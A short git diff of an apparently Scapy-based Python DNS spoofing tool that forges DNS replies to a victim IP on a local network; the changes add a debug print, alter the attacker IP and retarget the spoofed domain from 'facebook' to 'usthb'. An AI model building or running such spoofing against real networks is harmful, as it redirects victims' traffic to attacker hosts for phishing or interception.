@@ -11,6 +11,7 @@ class DNSSpoofer:
         """Spoof DNS responses for DNS queries."""
         if pkt.haslayer(DNS) and pkt[IP].src == self.victim_ip :
             qname = pkt[DNSQR].qname.decode()
+            print("DNS PACKET",qname)
 
             # Check for the domain you want to spoof
             #if b"example.com" in qname:  
@@ -67,8 +68,8 @@ if __name__ == "__main__":
         'mac' : "80:ca:4b:ac:f3:3"
     }
     attacker = {
-        'ip' : '192.168.1.72',
+        'ip' : '192.168.1.73',
         'mac' : "ac:bc:32:91:0a:ad"
     }
-    d = DNSSpoofer(attacker_ip=attacker.get('ip'),victim_ip=victim.get('ip'),domain="facebook")
+    d = DNSSpoofer(attacker_ip=attacker.get('ip'),victim_ip=victim.get('ip'),domain="usthb")
     d.spoof()
